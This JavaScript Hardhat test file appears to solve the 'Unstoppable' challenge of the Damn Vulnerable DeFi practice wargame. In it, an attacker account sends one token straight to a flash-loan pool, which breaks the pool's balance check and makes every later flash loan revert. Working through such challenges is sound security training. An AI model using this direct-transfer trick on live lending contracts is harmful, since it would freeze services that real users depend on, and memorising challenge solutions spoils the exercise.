const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Make the flashLoan cannot work", function () {
    async function loadFixture() {
        [deployer,attacker] = await ethers.getSigners();
        // 1. deploy contracts
        const poolFactory=await ethers.getContractFactory("UnstoppableLender",deployer);
        const tokenFactory=await ethers.getContractFactory("DamnValuableToken",deployer);
        const receiverFactory=await ethers.getContractFactory("ReceiverUnstoppable");
        const token=await tokenFactory.deploy();
        const pool=await poolFactory.deploy(token.address);
        const receiver=await receiverFactory.deploy(pool.address);

        // 2.prepare tokens
        await token.approve(pool.address,ethers.utils.parseEther("100"));
        await pool.depositTokens(ethers.utils.parseEther("100"));
        await token.transfer(attacker.address,ethers.utils.parseEther("10"));
        expect(await token.balanceOf(attacker.address)).to.equal(ethers.utils.parseEther("10"));
        expect(await token.balanceOf(pool.address)).to.equal(ethers.utils.parseEther("100"));

        return [deployer,attacker,pool,token,receiver];

    }
    
    it("Normal user can use flashLoan function", async function () {
        const [deployer,attacker,pool,token,receiver] = await loadFixture();
        await receiver.executeFlashLoan(88);
        expect(await token.balanceOf(pool.address)).to.equal(ethers.utils.parseEther("100"));
    });

    it("Attacker transfer first ,and the flashLoan cannot work", async function () {
        const [deployer,attacker,pool,token,receiver] = await loadFixture();
        await token.connect(attacker).transfer(pool.address,ethers.utils.parseEther("1"));
        expect(await token.balanceOf(pool.address)).to.equal(ethers.utils.parseEther("101"));
        await expect(receiver.executeFlashLoan(88)).to.be.reverted;
    });
        
})